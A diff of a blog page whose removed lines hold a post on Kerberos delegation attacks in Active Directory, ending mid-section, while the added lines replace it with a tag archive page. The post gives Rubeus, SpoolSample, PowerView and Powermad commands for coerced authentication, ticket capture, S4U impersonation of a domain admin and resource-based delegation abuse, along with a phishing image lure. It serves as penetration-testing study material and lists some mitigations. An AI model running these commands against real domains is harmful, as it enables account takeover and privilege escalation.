@@ -6,24 +6,15 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://example.com">
-  <title>Kerberos and Delegations | cppblog</title>
+  <title>Tag: reads | cppblog</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="A summary of Kerberos authentication and how to abuse various delegations in Active Directory context for privilege escalation and more.">
-<meta property="og:type" content="article">
-<meta property="og:title" content="Kerberos and Delegations">
-<meta property="og:url" content="http://example.com/2022/07/28/kerberos-delegations/index.html">
+  <meta property="og:type" content="website">
+<meta property="og:title" content="cppblog">
+<meta property="og:url" content="http://example.com/tags/reads/index.html">
 <meta property="og:site_name" content="cppblog">
-<meta property="og:description" content="A summary of Kerberos authentication and how to abuse various delegations in Active Directory context for privilege escalation and more.">
 <meta property="og:locale" content="en_US">
-<meta property="og:image" content="http://example.com/2022/07/28/kerberos-delegations/unconstrained.png">
-<meta property="og:image" content="http://example.com/2022/07/28/kerberos-delegations/co.png">
-<meta property="article:published_time" content="2022-07-28T07:00:00.000Z">
-<meta property="article:modified_time" content="2022-09-03T05:41:54.000Z">
 <meta property="article:author" content="cp">
-<meta property="article:tag" content="windows">
-<meta property="article:tag" content="activedirectory">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://example.com/2022/07/28/kerberos-delegations/unconstrained.png">
   
     <link rel="alternative" href="/atom.xml" title="cppblog" type="application/atom+xml">
   
@@ -151,367 +142,64 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            <article id="post-kerberos-delegations" class="article article-type-post " itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
+            
   
-    <h1 class="article-title" itemprop="name">
-      Kerberos and Delegations
+  
+    
+    
+      
+      
+      <section class="archives-wrap">
+        <div class="archive-year-wrap">
+          <a href="/archives/2022" class="archive-year">2022</a>
+        </div>
+        <div class="archives">
+    
+    <article class="archive-article archive-type-post">
+  <div class="archive-article-inner">
+    <header class="archive-article-header">
+      	<div class="article-meta">
+	      	<a href="/2022/12/14/fuzzing1/" class="archive-article-date">
+  	<time datetime="2022-12-14T08:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-12-14</time>
+</a>
+        </div>
+    	 
+  
+    <h1 itemprop="name">
+      <a class="archive-article-title" href="/2022/12/14/fuzzing1/">Fuzzing Reads 1</a>
     </h1>
   
 
-        
-        <a href="/2022/07/28/kerberos-delegations/" class="archive-article-date">
-  	<time datetime="2022-07-28T07:00:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-07-28</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>A summary of Kerberos authentication and how to abuse various delegations in Active Directory context for privilege escalation and more.</p>
-<span id="more"></span>
-
-<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>I’ve been studying Active Directory related attacks recently, and spent quite some time reading articles and practising Kerberos attacks.</p>
-<p>At the same time, it’s been a while since I wrote a blog post, so here it comes…</p>
-<p>This post has nothing novel. It’s just a summary of the many wonderful resources I came across online, so you hopefully don’t have to spend so much trouble hunting for a reason to why something works :)</p>
-<p>That being said, you should still always cross refer to other sources.</p>
-<h2 id="Kerberos-Authentication"><a href="#Kerberos-Authentication" class="headerlink" title="Kerberos Authentication"></a>Kerberos Authentication</h2><p>Kerberos is one of the modern ways Windows devices perform authentication in a domain setting. It is a successor to NTLM, and it’s an upgrade in terms of security. In order to break Kerberos, we have to review how it works first.</p>
-<p>Kerberos Authentication to a service consists of 3 steps:</p>
-<ol>
-<li>AS_REQ/AS_REP</li>
-<li>TGS_REQ/TGS_REP</li>
-<li>AP_REQ/AP_REP</li>
-</ol>
-<p>and consists of 3 parties:</p>
-<ol>
-<li>Client</li>
-<li>KDC(Server)</li>
-<li>SPN Provider(AppServer)</li>
-</ol>
-<p><em>Now you know why it’s called Kerberos</em></p>
-<h3 id="AS-REQ-AS-REP"><a href="#AS-REQ-AS-REP" class="headerlink" title="AS_REQ/AS_REP"></a>AS_REQ/AS_REP</h3><p>Client sends an Authentication Server Request(<code>AS_REQ</code>)(kerberos pre auth) that contains:<br>    - a timestamp encrypted using currently the AES hash of the user’s password<br>    - a username</p>
-<p>When the Server receives the request, it looks up the hash associated with the username and tries to decrypt the time stamp.</p>
-<p>If the server can decrypt the time stamp and the time stamp is not a duplicate, pre auth is successful.</p>
-<p>Server replies with <code>AS_REP</code>, containing:<br>    - a session key<br>    - a Ticket Granting Ticket(<code>TGT</code>)</p>
-<p>The session key encrypted using the Client’s password hash, thus the Client can decrypt, store in memory and reuse.<br><code>TGT</code> contains info about the Client such as the Client’s group memberships, Client’s domain, a time stamp, IP of client and the session key.<br><code>TGT</code> is encrypted by a secret key only known to the Server(password hash of <code>krbtgt</code> account), and cannot be decrypted by Client.</p>
-<p>Once Client receive the <code>AS_REP</code>, Server considers Client auth to complete. The <code>TGT</code> will be valid for 10 hours by default.<br>After which the Client will have to renew the ticket.</p>
-<h3 id="TGS-REQ-TGS-REP"><a href="#TGS-REQ-TGS-REP" class="headerlink" title="TGS_REQ/TGS_REP"></a>TGS_REQ/TGS_REP</h3><p>When the Client wishes to access domain resources, such as network shares, exchange mailboxes or other services with a registered SPN, it must again contact the Server.</p>
-<p>This time, the Client sends a Ticket Granting Service Request(<code>TGS_REQ</code>) that consists of:<br>    - a username<br>    - a timestamp that is encrypted with the session key<br>    - SPN of the resource<br>    - <code>TGT</code>(of course encrypted since the Client cannot decrypt it anyways)</p>
-<p><em>The username and SPN is also collectively called the Authenticator</em></p>
-<p>The Server receives this request.<br>If the SPN exists in the domain, <code>TGT</code> is decrypted and session key is extracted from <code>TGT</code>.<br>Session key is then used to decrypt the username and timestamp of the request.<br>The server checks that the TGT must have a valid timestamp, the username from <code>TGS_REQ</code> must match username in TGT, and Client IP must coincide with TGT IP.</p>
-<p>If all these passes, Server responds to Client with <code>TGS_REP</code>, containing:<br>    - SPN that is granted<br>    - a new session key for use between Client and SPN<br>    - a service ticket(<code>ST</code>) containing Client username, group memberships and newly created session key.</p>
-<p>The SPN and New Session Key are encrypted using the <code>TGT</code>(old) session key, while the <code>ST</code> is encrypted using password hash of the service account registered with the SPN.</p>
-<p>Now the Client can authenticate with the SPN App Server.</p>
-<h3 id="AP-REQ-AP-REP"><a href="#AP-REQ-AP-REP" class="headerlink" title="AP_REQ/AP_REP"></a>AP_REQ/AP_REP</h3><p>Client send to App Server an Application Request(<code>AP_REQ</code>), which includes:<br>    - a username<br>    - a timestamp encrypted with the new session key<br>    - <code>ST</code></p>
-<p>App Server decrypts <code>ST</code> using service account password hash, extracts username and session key.</p>
-<p>App Server then uses this session key to decrypt the username from <code>AP_REQ</code>.<br>If both username matches, access is granted and permissions are assigned based on the group memberships contained in the <code>ST</code>.</p>
-<p>Now the Client can access the requested service.</p>
-<h2 id="Scenario"><a href="#Scenario" class="headerlink" title="Scenario"></a>Scenario</h2><p>Domain: <strong>secure.local</strong><br>DC: <strong>dc.secure.local</strong><br>Compromised Account: <strong>secure.local\james</strong><br>Domain Admin: <strong>secure.local\amy</strong></p>
-<h2 id="Delegation"><a href="#Delegation" class="headerlink" title="Delegation"></a>Delegation</h2><p>Delegation allows a user or a service to act on behalf of another user to another service.</p>
-<p>A common implementation of this is where a user authenticates to a front-end web application that needs to pull data from a back-end database. The front-end application needs to authenticate to the back-end database (using Kerberos) as the user.</p>
-<h2 id="Unconstrained-Delegation"><a href="#Unconstrained-Delegation" class="headerlink" title="Unconstrained Delegation"></a>Unconstrained Delegation</h2><p>This is set in the Delegation field of the computer’s properties as <strong>Trust this computer for delegation to any service</strong></p>
-<img src="/2022/07/28/kerberos-delegations/unconstrained.png" class="" title="un">
-
-<p>When a user requests a service on a computer with unconstrained delegation enabled, the KDC(Server in Kerberos Auth Theory) will save a copy of the user’s <code>TGT</code> in the <code>ST</code> sent to the computer(App Server).</p>
-<p>That computer will then extract the <code>TGT</code> from <code>ST</code> and cache it in memory, in case it’s needed in the future, for delegating to other services.</p>
-<p>An interesting aspect to unconstrained delegation is that it will cache the user’s <code>TGT</code> regardless of which service is being accessed by the user.<br>So, if an admin accesses a file share or any other service on the machine that uses Kerberos, their <code>TGT</code> will be cached.</p>
-<p>If we can compromise a machine with unconstrained delegation, we can extract any TGTs from its memory and use them to impersonate the user against other services in the domain.</p>
-<p>I say <code>TGT</code> here, but the data we want to extract is <strong>NOT</strong> solely the <code>TGT</code>, because without the session key, a <code>TGT</code> is useless(review the theory section above).</p>
-<p><code>Rubeus</code>/<code>mimikatz</code>/<code>kekeo</code> alike, parse the <code>AP_REQ</code> and forms the <code>KRB_CRED</code> structure(output as a <code>.kirbi</code> file) which is an amalgamation of the session key, the <code>TGT</code>, and a bunch of other bureaucratic data.</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">KRB-CRED        ::= [APPLICATION <span class="number">22</span>] SEQUENCE &#123;</span><br><span class="line">        pvno            [<span class="number">0</span>] INTEGER (<span class="number">5</span>),</span><br><span class="line">        msg-type        [<span class="number">1</span>] INTEGER (<span class="number">22</span>),</span><br><span class="line">        tickets         [<span class="number">2</span>] SEQUENCE OF Ticket, &lt;- TGT</span><br><span class="line">        enc-part        [<span class="number">3</span>] EncryptedData -- EncKrbCredPart</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">EncKrbCredPart  ::= [APPLICATION <span class="number">29</span>] SEQUENCE &#123;</span><br><span class="line">        ticket-info     [<span class="number">0</span>] SEQUENCE OF KrbCredInfo,</span><br><span class="line">        nonce           [<span class="number">1</span>] UInt32 OPTIONAL,</span><br><span class="line">        timestamp       [<span class="number">2</span>] KerberosTime OPTIONAL,</span><br><span class="line">        usec            [<span class="number">3</span>] Microseconds OPTIONAL,</span><br><span class="line">        s-address       [<span class="number">4</span>] HostAddress OPTIONAL,</span><br><span class="line">        r-address       [<span class="number">5</span>] HostAddress OPTIONAL</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">KrbCredInfo     ::= SEQUENCE &#123;</span><br><span class="line">        key             [<span class="number">0</span>] EncryptionKey, &lt;- SESSION KEY</span><br><span class="line">        prealm          [<span class="number">1</span>] Realm OPTIONAL,</span><br><span class="line">        pname           [<span class="number">2</span>] PrincipalName OPTIONAL,</span><br><span class="line">        flags           [<span class="number">3</span>] TicketFlags OPTIONAL,</span><br><span class="line">        authtime        [<span class="number">4</span>] KerberosTime OPTIONAL,</span><br><span class="line">        starttime       [<span class="number">5</span>] KerberosTime OPTIONAL,</span><br><span class="line">        endtime         [<span class="number">6</span>] KerberosTime OPTIONAL,</span><br><span class="line">        renew-till      [<span class="number">7</span>] KerberosTime OPTIONAL,</span><br><span class="line">        srealm          [<span class="number">8</span>] Realm OPTIONAL,</span><br><span class="line">        sname           [<span class="number">9</span>] PrincipalName OPTIONAL,</span><br><span class="line">        caddr           [<span class="number">10</span>] HostAddresses OPTIONAL</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p><em><a target="_blank" rel="noopener" href="https://www.ietf.org/rfc/rfc4120.txt">https://www.ietf.org/rfc/rfc4120.txt</a></em></p>
-<p>This <code>.kirbi</code> file is supported by many tools, also cobalt strike’s <code>kerberos_ticket_use</code> command, and can be used to request <code>ST</code> for any service.</p>
-<h3 id="Enumeration"><a href="#Enumeration" class="headerlink" title="Enumeration"></a>Enumeration</h3><p>To find unconstrain delegated machines using ADSearch:</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\ADSearch.exe -<span class="literal">-search</span> <span class="string">&quot;(&amp;(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))&quot;</span> -<span class="literal">-attributes</span> samaccountname,dnshostname,operatingsystem</span><br></pre></td></tr></table></figure>
-
-<p>Using PowerView:</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-DomainComputer</span> <span class="literal">-Unconstrained</span> <span class="literal">-Properties</span> CN, DnsHostName, operatingsystem, lastlogon, pwdlastset</span><br></pre></td></tr></table></figure>
-
-<p>Using BloodHound:</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">MATCH (u:User &#123;dontreqpreauth:true&#125;) <span class="keyword">RETURN</span> u</span><br></pre></td></tr></table></figure>
-
-<p>Let’s say we find a computer <code>com1.secure.local</code>, that has unconstrained delegation enabled and is already compromised by us, we can attempt exploitation.</p>
-<h3 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h3><p>First we have to set up a “listener”, to automatically check if new TGTs are cached in our memory.</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Rubeus.exe monitor /targetuser:&lt;USERNAME&gt; /interval:<span class="number">10</span> /nowrap</span><br></pre></td></tr></table></figure>
-<p>Where we monitor the specific username every 10 seconds, and don’t line wrap the base64 output so we can copy easily.<br><strong>This command require elevation.</strong></p>
-<p>The goal now is to try to get a valuable target to authenticate to <code>com1.secure.local</code> via Kerberos, so we can cache their <code>TGT</code> in memory.</p>
-<p>One way is to social engineer a domain user into performing authentication(let’s say by sending them an email/document that contains an image to a UNC path)</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;\\com1.secure.local\pwn.png&quot; height&#x3D;&quot;1&quot; width&#x3D;&quot;1&quot; &#x2F;&gt;</span><br></pre></td></tr></table></figure>
-
-<p>This requires user interaction, and is not stealthy.</p>
-<p>The better alternative if available, is to use one of the automatic triggers (<a target="_blank" rel="noopener" href="https://github.com/cube0x0/SharpSystemTriggers">https://github.com/cube0x0/SharpSystemTriggers</a>).</p>
-<p>I like the printer bug(<a target="_blank" rel="noopener" href="https://github.com/leechristensen/SpoolSample">https://github.com/leechristensen/SpoolSample</a>), because it is unpatched on Windows Server 2016 and below, is enabled by default and can be accessed by regular domain users, and can even force domain controllers to authenticate to us.</p>
-<p>Forcing an authentication is as easy as:</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\SpoolSample.exe dc com1</span><br></pre></td></tr></table></figure>
-
-<p>If successful, our Rubeus monitoring should return the base64 encoded <code>.kirbi</code> file contents, which contains the <code>TGT</code> of the machine account <code>dc$</code>.</p>
-<p>Now even with the machine account’s <code>TGT</code>, we can’t perform fileshare actions on the machine, because machines do not get local admin access to themselves over <code>CIFS</code>.</p>
-<p>What we can do is use <code>S4U2Self</code> and request a TGS to ourselves:</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Rubeus.exe s4u /self /user:dc<span class="variable">$</span> /impersonateuser:amy /ticket:&lt;base64kirbi&gt; /nowrap /targetdomain:secure.local /altservice:cifs/dc.secure.local</span><br></pre></td></tr></table></figure>
-
-<p>Note how the <code>/altservice</code> field has to contain the full msdsspn form, which is <code>cifs/dc.secure.local</code>.<br>This is to simulate if we used <code>ASN1editor</code> to rewrite the ticket manually.</p>
-<p><em>If S4U2Self is foreign to you, skip this and read the next section on Constrained Delegation first.</em></p>
-<p>Afterwards, we can save the ticket, <code>make_token</code> and <code>kerberos_ticket_use</code>.</p>
-<p>Another bypass is to perform <code>dcsync</code>(yes our machine account can do that), get a domain admin account, and get onto the DC that way.</p>
-<h3 id="Mitigations"><a href="#Mitigations" class="headerlink" title="Mitigations"></a>Mitigations</h3><p>Don’t allow unconstrained delegation!</p>
-<p>Configure all admin/privileged accounts to be “Account is sensitive and cannot be delegated”</p>
-<p>OR</p>
-<p>Add sensitive accounts to the Protected Users group.</p>
-<p>Patch those automatic trigger attacks.</p>
-<h2 id="Constrained-Delegation"><a href="#Constrained-Delegation" class="headerlink" title="Constrained Delegation"></a>Constrained Delegation</h2><p>You might be wondering “Okay, now you ask me to disable unconstrained delegation. But how am I going to achieve delegation??”</p>
-<p>Microsoft has answers to this:<br>By using Constrained Delegation instead.</p>
-<p>Constrained delegation was released as a safer means for services to perform Kerberos delegation.</p>
-<p>This is set in the Delegation field of the computer’s properties as <strong>Trust this computer for delegation to specific services only</strong></p>
-<img src="/2022/07/28/kerberos-delegations/co.png" class="" title="co">
-<p><em>Ignore the red box please</em></p>
-<p>It aims to restrict the services to which the server can act on behalf of a user.<br>It no longer allows the server to cache the TGTs of other users, but allows it to request a <code>ST</code> for another user with its own <code>TGT</code>.</p>
-<p>This sounds quite general, so let’s look at some theory first on how this works exactly.</p>
-<h3 id="Theory"><a href="#Theory" class="headerlink" title="Theory"></a>Theory</h3><p>There are some terms we have to understand.</p>
-<p>TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION(<code>T2A4D</code>)<br>Service For User To Self(<code>S4U2Self</code>)<br>Service For User To Proxy(<code>S4U2Proxy</code>)</p>
-<p>There are two types of constrained delegation allowed.</p>
-<p>The first one is if <strong>Use Kerberos only</strong> is selected.<br>The second one is if <strong>Use any authentication protocol</strong> is selected.</p>
-<p>If the second option is selected, the <code>T2A4D</code> flag will be set on the account.<br>Along with the <code>S4U2Self</code> extension, this allows for <strong>protocol transition</strong>.</p>
-<p>For example, John authenticates to WebServer-1(svc_web user SPN), which does not support Kerberos.<br>In order for WebServer-1 to authenticate to backend database DB-1 via Kerberos, it has to go through <strong>proctocol transition</strong>, which is implemented by <code>S4U2Self</code>.</p>
-<p><code>S4U2Self</code> and <code>T2A4D</code> allows the svc_web user to get a forwadable ST for John(any user in fact), despite not authenticating through Kerberos.</p>
-<p>If <code>T2A4D</code> is not set, the svc_web user can still get a ST, but it will not be forwardable!(still exploitable in some scenario, check Resource-Based Constrained Delegation section later!)</p>
-<p>Thus, WebServer-1 requests a ST from the KDC for John, without requiring a password, as the svc_web user.</p>
-<p>KDC checks for the <code>T2A4D</code> flag, and checks if John is allowed to be delegated(not in Protected Users etc), and returns a forwadable ST if successful.</p>
-<p>The ticket has to be forwadable, to be used with the <code>S4U2Proxy</code> extension.</p>
-<p><code>S4U2Proxy</code> allows this ticket to be used for the services specified in the <code>msDS-AllowedToDelegateTo</code> attribute on the svc_web account.</p>
-<p>So WebServer-1 passes the ST back to the KDC, and requests a ST for the database service.</p>
-<p>If the database service is listed in the <code>msDS-AllowedToDelegateTo</code> attribute on svc_web, a ST for the database service as John will be returned.</p>
-<p>Thus, if we control the svc_web account and <code>T2A4D</code> is set, we can impersonate any delegatable user in the domain for the services listed in the <code>msDS-AllowedToDelegateTo</code>attribute, without a password!</p>
-<p>If <code>T2A4D</code> is not set(option 1), we can use the ST already cached on the computer to access those resources as that user, possibly lateral movement.<br>Alternatively, we can try <strong>Resource-Based Constrained Delegation</strong> attack, discussed in detail in the following section.</p>
-<h3 id="Enumeration-1"><a href="#Enumeration-1" class="headerlink" title="Enumeration"></a>Enumeration</h3><p>To find constrain delegated machines using ADSearch:</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\ADSearch.exe -<span class="literal">-search</span> <span class="string">&quot;(&amp;(objectCategory=computer)(msds-allowedtodelegateto=*))&quot;</span> -<span class="literal">-attributes</span> cn,dnshostname,samaccountname,msds<span class="literal">-allowedtodelegateto</span> -<span class="literal">-json</span></span><br></pre></td></tr></table></figure>
-
-<p>To find constrain delegated machines using PowerView:</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-DomainComputer</span> <span class="literal">-TrustedToAuth</span> <span class="literal">-Properties</span> CN, msds<span class="literal">-allowedtodelegateto</span>, useraccountcontrol | <span class="built_in">fl</span></span><br></pre></td></tr></table></figure>
-
-<p>To find constrain delegated users using PowerView:</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-DomainUser</span> <span class="literal">-TrustedToAuth</span> <span class="literal">-Properties</span> CN, msds<span class="literal">-allowedtodelegateto</span>, useraccountcontrol | <span class="built_in">fl</span></span><br></pre></td></tr></table></figure>
-
-<p>In the <code>useraccountcontrol</code> property of the output, we can see if <code>T2A4D</code> is set and attack accordingly.</p>
-<h3 id="Exploitation-with-T2A4D"><a href="#Exploitation-with-T2A4D" class="headerlink" title="Exploitation with T2A4D:"></a>Exploitation with T2A4D:</h3><p>To perform the delegation, we ultimately need the <code>TGT</code> of the principal (machine or user) trusted for delegation, for which there are two main methods.</p>
-<p>We can either use <code>Rubeus dump</code> to try to dump it from memory, or request one with <code>Rubeus asktgt</code> style.</p>
-<p>After we get the TGT, we can talk about exploitation.</p>
-<p>Let’s say we compromised the computer account <code>com1.secure.local</code> that is allowed to delegate to <code>cifs/dc.secure.local</code>.</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.\Rubeus.exe s4u /impersonateuser:amy /msdsspn:cifs/dc.secure.local /user:com1<span class="variable">$</span> /ticket:&lt;base64kirbi&gt; /altservice:cifs /nowrap</span><br></pre></td></tr></table></figure>
-
-<p>Where:<br><code>/impersonateuser</code> is the user we want to impersonate.<br><code>/msdsspn</code> is the service principal name that COM1 is allowed to delegate to.<br><code>/user</code> is the principal allowed to perform the delegation.<br><code>/ticket</code> is the TGT for <code>/user</code>.<br><code>/altservice</code> is the service we want to use.</p>
-<p><code>/altservice</code> works because the service name is not validated(<a target="_blank" rel="noopener" href="https://www.secureauth.com/blog/kerberos-delegation-spns-and-more/">https://www.secureauth.com/blog/kerberos-delegation-spns-and-more/</a>).</p>
-<p>If we have constrained delegation to <code>ldap/dc.secure.local</code>, we will specify <code>/msdsspn:ldap/dc.secure.local</code> and <code>/altservice:cifs</code> to get cifs on <code>dc</code>.<br>Of course in the example above, altservice is not needed since we already have cifs.</p>
-<p>By passing in the base64 kirbi blob, Rubeus helps us perform <code>S4U2Self</code> and <code>S4U2Proxy</code>, granting us a <code>ST</code> for the <code>CIFS</code> service on <code>dc</code> as amy.</p>
-<p>We can base64 decode and save to our disk, then <code>make_token</code> and <code>kerberos_ticket_use</code>.</p>
-<p>Note: Make sure to always use the FQDN when performing actions with this ticket, or else an error will occur.<br>For example, even though our ticket is for CIFS, we can’t do a <code>ls \\dc\c$</code>. Instead we should do <code>ls \\dc.secure.local\c$</code>.</p>
-<p>With CIFS, we can upload files also and start services, allowing psexec.</p>
-<p>Quoting harmj0y(<a target="_blank" rel="noopener" href="https://twitter.com/harmj0y">https://twitter.com/harmj0y</a>):</p>
-<p><em>For the HOST SPN this allows complete remote takeover.<br>For a MSSQLSvc SPN this would allow DBA rights.<br>A CIFS SPN would allow complete remote file access.<br>A HTTP SPN it would likely allow for the takeover of the remote webservice<br>LDAP SPN allows for DCSync<br>HTTP/SQL service accounts, even if they aren’t elevated admin on the target, can also possibly be abused with Rotten Potato to elevate rights to SYSTEM (though I haven’t tested this personally)</em></p>
-<h2 id="Resource-Based-Constrained-Delegation"><a href="#Resource-Based-Constrained-Delegation" class="headerlink" title="Resource-Based Constrained Delegation"></a>Resource-Based Constrained Delegation</h2><p>Windows Server 2012 implemented a new type of delegation, <strong>Resource-Based Constrained Delegation</strong>, in response to some of the downsides of traditional constrained delegation.</p>
-<p>Specifically, resource-based constrained delegation allows for delegation settings to be configured on the target service/resource instead of on the “front-end” account (i.e. the account configured with msDS-AllowedToDelegateTo settings in the traditional constrained delegation example.)</p>
-<p>So if John accesses WebServer1, which accesses backend database DB1, DB1 can configure a RBCD such that it allows WebServer1 to access it, instead of WebServer1 whitelisting DB1 as in traditional constrained delegation.</p>
-<p>The good thing about this feature is that you do not need huge admin privs to allow delegation, unlike Unconstrained Delegation or traditional Constrained Delegation.</p>
-<p><strong>GenericAll/GenericWrite/WriteDacl is all you need to configure RBCD.</strong></p>
-<p>We can use this feature to <strong>abuse a GenericWrite on a computer object into Escalated RCE</strong>, or <strong>mimic protocol transition</strong>(T2A4D in traditional constrained delegation).</p>
-<h3 id="Enumeration-2"><a href="#Enumeration-2" class="headerlink" title="Enumeration"></a>Enumeration</h3><p>We can use BloodHound to find GenericWrite, or <a target="_blank" rel="noopener" href="https://gist.github.com/FatRodzianko/e4cf3efc68a700dca7cedbfd5c05c99f">https://gist.github.com/FatRodzianko/e4cf3efc68a700dca7cedbfd5c05c99f</a></p>
-<h3 id="Exploit-GenericWrite-in-fact-GenericAll-GenericWrite-WriteDacl-to-Escalated-RCE"><a href="#Exploit-GenericWrite-in-fact-GenericAll-GenericWrite-WriteDacl-to-Escalated-RCE" class="headerlink" title="Exploit GenericWrite(in fact GenericAll/GenericWrite/WriteDacl) to Escalated RCE"></a>Exploit GenericWrite(in fact GenericAll/GenericWrite/WriteDacl) to Escalated RCE</h3><p>Overview:<br>We compromised the account James, which has GenericWrite over a computer dc.</p>
-<p>John creates a new computer object called fake1.(no admin priv required)</p>
-<p>John leverages GenericWrite on dc and updates its object’s attribute <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> to enable fake1 to impersonate and authenticate any domain user that can then access the target system dc.</p>
-<p>John uses fake1’s AES key to get a TGT, and then impersonate a domain admin to access dc like in traditional constrained delegation.</p>
-<p>Profit.</p>
-<p>By default, a domain member usually can add up to 10 computers to the domain.</p>
-<p>To check this, we can query the root domain object and look for property <code>ms-ds-machineaccountquota</code></p>
-<p>In PowerView:</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-DomainObject</span> dc.secure.local <span class="literal">-Properties</span> ms<span class="literal">-ds</span><span class="literal">-machineaccountquota</span></span><br></pre></td></tr></table></figure>
-
-<p>We must also make sure the DC is at least <strong>Windows Server 2012</strong>, check with <code>Get-DomainController -Domain secure.local</code></p>
-<p>Finally, we import ActiveDirectory(if fail, get <a target="_blank" rel="noopener" href="https://github.com/samratashok/ADModule">https://github.com/samratashok/ADModule</a>) and use the inbuilt <code>Get-ADComputer dc -Properties PrincipalsAllowedToDelegateToAccount</code> to take note if any delegation rules are already set, so we append to those/revert back after our modification.</p>
-<p>If we can’t import ActiveDirectory, use powerview <code>Get-DomainObject -Identity dc | select msds-allowedtoactonbehalfofotheridentity</code> to check.</p>
-<p>To create a computer object, import <a target="_blank" rel="noopener" href="https://github.com/Kevin-Robertson/Powermad">https://github.com/Kevin-Robertson/Powermad</a></p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">New-MachineAccount</span> <span class="literal">-MachineAccount</span> fake1 <span class="literal">-Password</span> <span class="variable">$</span>(<span class="built_in">ConvertTo-SecureString</span> <span class="string">&#x27;123456&#x27;</span> <span class="literal">-AsPlainText</span> <span class="literal">-Force</span>) <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>
-
-<p>Confirm creation with <code>Get-DomainComputer fake1</code></p>
-<p>Of course, if we have already compromised an account with a SPN, we don’t have to create this computer account.</p>
-<p>Now we have to modify dc such that its <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> attribute allows fake1 to access it.</p>
-<p>There are two ways to go about it.</p>
-<p>If we don’t have access to the ActiveDirectory module:<br>We will have to update <code>msDS-AllowedToActOnBehalfOfOtherIdentity</code> manually.</p>
-<p>This property stores a security descriptors as binary format to dictate access to the account.</p>
-<p>First we get the sid of our created/compromised account:</p>
-<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-DomainComputer</span> <span class="literal">-Identity</span> fake1 <span class="literal">-Properties</span> objectsid | <span class="built_in">Select</span> <span class="literal">-Expand</span> objectsid</span><br></pre></td></tr></table></figure>
-<p>(If we are using a compromised user SPN account then obviously Get-DomainUser)</p>
-<p>Then we use this powershell one liner to create a binary security descriptor and set it on dc:</p>
